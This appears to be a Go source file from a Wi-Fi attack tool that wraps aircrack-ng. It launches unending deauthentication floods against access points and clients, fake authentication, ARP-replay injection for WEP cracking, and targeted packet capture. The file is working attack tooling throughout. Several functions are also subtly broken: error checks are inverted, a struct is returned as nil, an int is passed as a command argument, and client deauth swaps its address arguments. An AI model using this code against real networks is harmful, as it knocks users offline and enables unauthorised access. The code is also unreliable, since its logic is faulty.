package AP

import (
	"os"
	"strconv"
	"strings"
	"time"

	"os/exec"

	"../attacks"
)

// JSON exportable structs
type (
	// AP discovered thanks to airodump-ng
	AP struct {
		Bssid   string `json:"bssid"`
		First   string `json:"first seen at"`
		Last    string `json:"last seen at"`
		Channel int    `json:"channel"`
		Speed   int    `json:"speed"`
		Privacy string `json:"privacy"`
		Cipher  string `json:"cipher"`
		Auth    string `json:"auth"`
		Power   int    `json:"power"`
		Beacons int    `json:"beacons"`
		IVs     int    `json:"ivs"`
		Lan     string `json:"lan ip"`
		IdLen   int    `json:"id len"`
		Essid   string `json:"essid"`
		Key     string `json:"key"`
		//Wps     bool   `json:"wps"`
	}

	// Client discovered
	Client struct {
		// MAC address
		Station string `json:"station"`
		First   string `json:"first seen at"`
		Last    string `json:"last seen at"`
		Power   int    `json:"power"`
		Packets int    `json:"packets"`
		Bssid   string `json:"bssid"`
		Probed  string `json:"probed essids"`
	}
)

var captures_nb = 0

// TODO: GenKeys(): gen default keys (routerkeygen)

// DEAUTH infinitely the AP using broadcast address
func (a *AP) Deauth(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", a.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Deauth",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}

// Try a fake auth on the ap
// !! May take some time, better if runned in a goroutine
func (a *AP) FakeAuth(iface string) (bool, error) {
	cmd := exec.Command("aireplay-ng", "-1", "0", "-a", a.Bssid, "-T", "1", iface)

	output, err := cmd.Output()

	if err != nil {
		return false, err
	}

	if strings.Contains(string(output), "Association successful") {
		return true, nil
	} else {
		return false, nil
	}
}

// ARP replay!!
func (a *AP) ArpReplay(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "-3", "-a", a.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "ArpReplay",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}

// Start a capture process
func (a *AP) Capture(iface string) (attacks.Attack, string, error) {
	path := "go-wifi_capture-" + strconv.Itoa(captures_nb)
	captures_nb += 1

	// Make a specific dir so we do not mix captures
	// TODO: change mode
	err := os.Mkdir(path, 766)
	if err == nil {
		return nil, nil, err
	}

	path += "go-wifi"
	cmd := exec.Command("airodump-ng", "--write", path, "-c", a.Channel, "--output-format", "pcap", "--bssid", a.Bssid, iface)

	err = cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Capture",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	// Because of an import cycle, we cannot build the Capture object, we just return the dir's path
	return cur_atk, path, err
}

// DEAUTH infinitely the Client
func (c *Client) Deauth(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", c.Station, "-d", c.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Deauth",
		Target:  c.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}